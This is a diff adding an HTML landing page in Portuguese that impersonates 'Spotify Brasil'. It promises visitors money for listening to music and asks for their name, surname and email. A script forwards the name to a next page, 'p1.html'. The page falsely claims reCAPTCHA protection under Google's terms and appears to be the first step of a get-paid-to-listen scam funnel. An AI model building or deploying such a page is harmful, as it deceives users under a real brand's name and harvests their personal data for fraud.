@@ -1,0 +1,139 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify</title>
+
+    <!-- FONT GOOGLE POPPINS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            background-color: rgb(24, 24, 24);
+            justify-content: center; /* Centraliza horizontalmente */
+            align-items: center;    /* Centraliza verticalmente */
+          }
+          .centralizado {
+            width: 300px;
+            background-color: rgb(0, 0, 0);
+            text-align: center;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: 10px;
+          }
+          *{
+            font-family: "Poppins", sans-serif;
+            color: white;
+          }
+          #logocentral{
+            width: 90px;
+          }
+          #textoprincipalsptfy{
+            font-size: 23px;
+            font-weight: 700;
+          }
+          #descricaoiniciospotify{
+            color: rgb(168, 168, 168);
+            margin-top: -10px;
+            font-size: 15px;
+          }
+          #descricaoiniciospotifyy{
+            color: rgb(168, 168, 168);
+            font-size: 14px;
+            font-weight: 500;
+          }
+          #divisorlinha{
+            width: 95%;
+            height: 1px;
+            background-color: rgb(105, 105, 105);
+          }
+          #txtinputmeil{
+            color: rgb(168, 168, 168);
+          }
+          #logincadastro{
+            display: flex;
+            font-size: 15px;
+            width: 100%;
+            flex-direction: column;
+            text-align: left;
+          }
+          #inputcadastro, #nomeInput{
+            padding: 13px 10px;
+            color: rgb(168, 168, 168);
+            border-radius: 10px;
+            margin-top: 9px;
+            border: 1px solid rgb(168, 168, 168);
+            background-color: rgb(24, 24, 24);
+          }
+          #botaoprocximetapa{
+            padding: 13px 10px;
+            background-color: rgb(1, 214, 97);
+            color: white;
+            margin-top: 20px;
+            border-radius: 50px;
+            border: 1px solid rgb(1, 214, 97);
+            text-decoration: none;
+            width: 90%;
+            font-weight: 600;
+          }
+    </style>
+</head>
+<body>
+    <div class="centralizado">
+        <!-- IMAGEM DA LOGO -->
+        <img src="images/logowhite.png" id="logocentral">
+
+        <!-- TEXTO POP UP -->
+         <p id="textoprincipalsptfy">
+            Seja bem-vindo ao<br>Spotify Brasil
+         </p>
+
+         <!-- DESCRICAO -->
+          <p id="descricaoiniciospotify">
+            Faça seu <b>cadastro</b> e ganhe <br>dinheiro ouvindo músicas de <br>grandes artistas e ajude a moldar o futuro da música no Brasil!
+          </p>
+
+          <!-- DIVISOR -->
+           <!--<div id="divisorlinha"></div>-->
+
+           <!-- DADOS DE LOGIN -->
+            <div id="logincadastro">
+                <!--<p id="txtinputmeil">
+                    Insira seu melhor e-mail para cadastro
+                </p>-->
+                <input type="text" placeholder="Nome" id="nomeInput">
+                <input type="text" placeholder="Sobrenome" id="inputcadastro">
+                <input type="text" placeholder="Seu melhor e-mail aqui" id="inputcadastro">
+            </div>
+
+            <button onclick="redirecionar()" id="botaoprocximetapa">Cadastrar e ganhar</button>
+
+            <script>
+                function redirecionar() {
+                    // Captura o valor do input
+                    const nome = document.getElementById('nomeInput').value;
+                
+                    // Define a URL da próxima página
+                    const proximaPagina = 'p1.html';
+                
+                    // Constrói a URL com o parâmetro de consulta
+                    const urlComParametro = `${proximaPagina}?nome=${encodeURIComponent(nome)}`;
+                
+                    // Redireciona o usuário para a próxima página com o parâmetro
+                    window.location.href = urlComParametro;
+                }                
+            </script>
+
+            <p id="descricaoiniciospotifyy">
+                Este site é protegido pelo reCAPTCHA e está sujeito �&nbsp; <b style="color: rgb(1, 214, 97); font-weight: 500;">Política de Privacidade</b> e aos <b style="color: rgb(1, 214, 97); font-weight: 500;">Termos de Serviço do Google.</b>
+            </p>
+      </div>
+
+</body></html>
